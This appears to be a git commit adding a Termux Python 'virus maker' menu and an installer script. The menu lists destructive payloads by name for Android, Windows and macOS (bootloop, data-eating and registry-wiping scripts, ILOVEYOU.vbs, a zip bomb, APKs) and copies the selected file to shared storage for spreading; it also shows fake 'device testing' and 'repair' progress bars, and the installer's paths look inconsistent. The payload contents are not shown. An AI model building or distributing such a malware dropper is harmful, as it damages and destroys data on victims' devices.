cd1b95d7a57cda2e1dbea3f03fece98ce1158670
cccvev <75307540+cccvev@users.noreply.github.com>
2020-12-03 15:19:49 +0200

    Add files via upload

---
+++ ELSHAPEH-ELMODAMER.py
@@ -0,0 +1,455 @@
+import time
+from time import sleep
+from V7xStyle import Animation
+from V7xStyle import Style
+from time import sleep as timeout
+import os
+os.system("clear")
+from N4Tools.Design import Text
+An = Animation
+def wa ():
+#
+#
+#
+    An.DL(
+        text="G#<<<<Please Wait....>>>> ",
+        t=0.4,
+        width=25,
+    )
+T=Text()
+arabic='الشبح المدمر'
+arabicc='هذه اداه من صنع الشبح المدمر'
+arabiccc='كلمني واتساب: 6388 390 109 20+'
+def t(nn,t_):
+        print(t_)
+        print('')
+        for i in range(0,33):
+                i+=1
+                txt='\033[1;32m▒'*45
+                f=i*'\033[1;31m▊'
+                tt=i*3+1
+                ttt=str(tt)
+                print(txt+'┊'+ttt+'%',end='\r')
+                print(T.arabic(arabic) + '┊{}'.format(f),end='\r')
+                time.sleep(nn)
+        print('')
+
+def lo():
+
+    time.sleep(0.2)
+    print (' ')
+    t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+    print ('\033[1;33mDone............')
+    print (' ')
+    t(0.1,'\n\t   \033[1;31m[ TESTING YOUR DEVICE .... ]')
+    print ('\033[1;33mDone.................')
+    print (' ')
+    t(0.1,'\n\t   \033[1;31m[ TESTING YOUR CPU .... ]')
+    print ('\033[1;33mDone.....................')
+    print (' ')
+    t(0.1,'\n\t   \033[1;31m[ FIX & REPAIRE YOUR SYSTEM .... ]')
+    print (' ')
+    time.sleep(0.2)
+    print ('\033[1;33mDone............')
+    print (' ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ \033[1;93m1%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ █ █ █ █ \033[1;93m5%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ █ █ █ █ █ \033[1;93m10%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ \033[1;93m15%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ █ █ █ █ █ █ █ \033[1;93m25%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ \033[1;93m30%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ \033[1;93m40%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ \033[1;93m50%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ █ \033[1;93m60%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m65%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m70%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m75%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m80%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m85%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m 90%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▃ ▄ ▅ ▆ ▇ █ █ █ █ ▇ █ █ ▇ █ █ █ █ █ █ █ █ █ \033[1;93m 95%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[1;93mLoading\033[1;32m▁▁ ▂ ▂ ▃ ▄ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ \033[1;93m 99%")
+    time.sleep(0.2)
+    print ('            ')
+    print ("\033[92mDone.....!")
+    print ('            ')
+    time.sleep(3)
+    os.system ('clear')
+lo()
+
+
+
+
+def vm () :
+    print ("\033[1;33m        \    \    \. \\\.__,-“-.__.///  ./  ./    /  ")
+    print ("\033[1;33m         \.   \`.  \`.-'“ _,=|=._ “”`-.’/  ’/   ./  ")
+    print ("\033[1;33m          \`.  \_`-’’ //  _,=“=._  \\  ``-_/   ./   ")
+    print ("\033[1;33m           \`-’,\=,'\\_. \ _,=“=._//,_///_./,`-'/     ")
+    print ("\033[1;33m            \.   \.      __,-“-.__   \033[1;31m   ./   ./       ")
+    print ("\033[1;31m        \.  \033[1;33m \`. \ `.-'“” _,=“=._ “”`-.\033[1;31m’/  .’/   ./    ")
+    print ("\033[1;31m         \`. \033[1;31m \_`.““      _,=“=._      ``-'\033[1;31m_/  .’/      ")
+    print ("\033[1;31m          \ `-\033[1;31m',-._   _.  _,=“=._  ,_   _.-,`-’\033[1;31m /      ")
+    print ("\033[1;31m       \. /`,-'\033[1;33m,-._\033[1;31m”””  \ _,=“=._ /  “””\033[1;33m_.-,\033[1;31m`-,’\ ./  ")
+    print ("\033[1;31m        \`-' \033[1;33m /    `-._ \033[1;31m “       “ \033[1;33m _.-’    \ \033[1;31m `-’/  ")
+    print ("\033[1;31m        /)  \033[1;33m (   \033[1;31m @ \033[1;33m   \ \033[1;31m   ,-.   \033[1;33m /   \033[1;31m @ \033[1;33m   ) \ ")
+    print ("\033[1;31m     ,-’“    \033[1;33m `-.       \ \033[1;31m /   \ \033[1;33m /       .-'   \033[1;31m  ”`-, ")
+    print ("\033[1;31m   ,’_._      \033[1;33m   `-.____/ \033[1;31m/  _  \ \033[1;33m\____.-'     \033[1;31m    _._`,  ")
+    print ("\033[1;31m  /,’   `.               \033[1;31m \_/ \_/             \033[1;31m   .'   `,\   ")
+    print ("\033[1;31m /'       )                  _                  (       `\    ")
+    print ("\033[1;31m         /   _,-’“`-.  ,++|T|||T|++.  .-'“`-,_   \            ")
+    print ("\033[1;31m        / ,-’        \/|`|`|`|'|’|‘|\/        `-, \          ")
+    print ("\033[1;31m       /,'            || | | | | | ||            `,\        ")
+    print ("\033[1;31m      /'               ` | | | | | ’               `\      ")
+    print ("\033[1;31m                         ` | | | '                        ")
+    print (' ')
+    print ("                                   by ELSHAPEH-ELMODAMER")
+    print ("                           call me whtasapp:+20 109 390 6388")
+    print ("" + T.arabic(arabicc) + "")
+    print ("" + T.arabic(arabiccc) + "")
+    print (" ")
+    print ("\033[1;36m___________________android_________________________")
+    vma=[
+    '[01]bootloop.sh  ',
+    '[02]dataeater.sh ',
+    '[03]trash.sh     ',
+    '[04]mvairus.sh   ',
+    '[05]freeze.sh    ',
+    '[06]fbcr2018.apk ',
+    '[07]elite.apk    ',
+    '[08]mobelejen.apk',
+    '[09]vi4a.apk     ',
+    '[10]zipbomb.zip  ',
+#
+    ]
+#
+#
+    vmaa=Style(*vma).Square(cols=2,
+            Equal=True,
+            space=2)
+    print (vmaa)
+#
+    print ("\033[1;36m___________________windows_________________________")
+    vmaaa=[
+    '[11]kuis.bat    ',
+    '[12]koce.bat    ',
+    '[13]cmd.bat     ',
+    '[14]capslock.vbs',
+    '[15]alay.vbs    ',
+    '[16]RIP.bat     ',
+    '[17]PCT.bat     ',
+    '[18]ILOVEYOU.vbs',
+    '[19]sleepy.bat  ',
+    '[20]regeater.bat',
+#
+    ]
+    vmaw=Style(*vmaaa).Square(cols=2,
+            Equal=True,
+            space=2)
+    print (vmaw)
+#
+    print ("\033[1;36m___________________MACOSX_________________________")
+#
+    vmc=[
+    '[21]nothing.app ',
+    '[22]trinoids.app',
+    '[00]back to main',
+#
+    ]
+#
+    vmcc=Style(*vmc).Square(cols=2,
+            Equal=True,
+            space=2)
+    print (vmcc)
+#
+    vmake=(input("==>>>> "))
+    if vmake == '1':
+        os.system("""
+        cd .vmaker
+        cp bootloop.sh /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+    elif vmake == '2':
+        os.system("""
+        cd .vmaker
+        cp dataeater.sh /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+    elif vmake == '3':
+        os.system("""
+        cd .vmaker
+        cp trash.sh /sdcard
+        cd ..
+        """)
+        vm()
+    elif vmake == '4':
+        os.system("""
+        cd .vmaker
+        cp mvairus.sh /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+    elif vmake == '5':
+        os.system("""
+        cd .vmaker
+        cp freeze.sh /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '6':
+        os.system("""
+        cd .vmaker
+        cp fbcr2018.apk /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '7':
+        os.system("""
+        cd .vmaker
+        cp elite.apk /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '8':
+        os.system("""
+        cd .vmaker
+        cp mobelejen.apk /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '9':
+        os.system("""
+        cd .vmaker
+        cp vi4a.apk /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '10':
+        os.system("""
+        cd .vmaker
+        cp zipbomb.zip /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '11':
+        os.system("""
+        cd .vmaker
+        cp kuis.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '12':
+        os.system("""
+        cd .vmaker
+        cp koce.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '13':
+        os.system("""
+        cd .vmaker
+        cp cmd.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+    elif vmake == '14':
+        os.system("""
+        cd .vmaker
+        cp capslock.vbs /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '15':
+        os.system("""
+        cd .vmaker
+        cp alay.vbs /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+    elif vmake == '16':
+        os.system("""
+        cd .vmaker
+        cp RIP.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+    elif vmake == '17':
+        os.system("""
+        cd .vmaker
+        cp PCT.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '18':
+        os.system("""
+        cd .vmaker
+        cp ILOVEYOU.vbs /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+    elif vmake == '19':
+        os.system("""
+        cd .vmaker
+        cp sleepy.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+#
+    elif vmake == '20':
+        os.system("""
+        cd .vmaker
+        cp regeater.bat /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+#
+    elif vmake == '21':
+        os.system("""
+        cd .vmaker
+        cp nothing.app /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+#
+#
+    elif vmake == '22':
+        os.system("""
+        cd .vmaker
+        cp trinoids.app /sdcard
+        cd ..
+        """)
+        wa()
+        os.system("clear")
+        vm()
+#
+#
+#
+#
+    elif vmake == '00':
+        os.system("exit")
+#
+#
+    else:
+        print ("Wrong input")
+        time.sleep(2)
+        os.system("clear")
+        vm()
+
+
+vm()
---
+++ install.py
@@ -0,0 +1,16 @@
+import os
+os.system("""
+cd
+git clone https://github.com/cccvev/ELSHAPEH-ELMODAMER
+mv ELSHAPEH-ELMODAMER $HOME
+mv ELSHAPEH-ELMODAMERRR $HOME
+cd ELSHAPEH-ELMODAMERRR
+mkdir .vmaker
+cd
+cd ELSHAPEH-ELMODAMER
+mv * /data/data/com.termux/files/home/ELSHAPEH-ELMODAMER√/.vmaker
+cd
+cd ELSHAPEH-ELMODAMERRR
+python ELSHAPEH-ELMODAMER.py
+
+""")
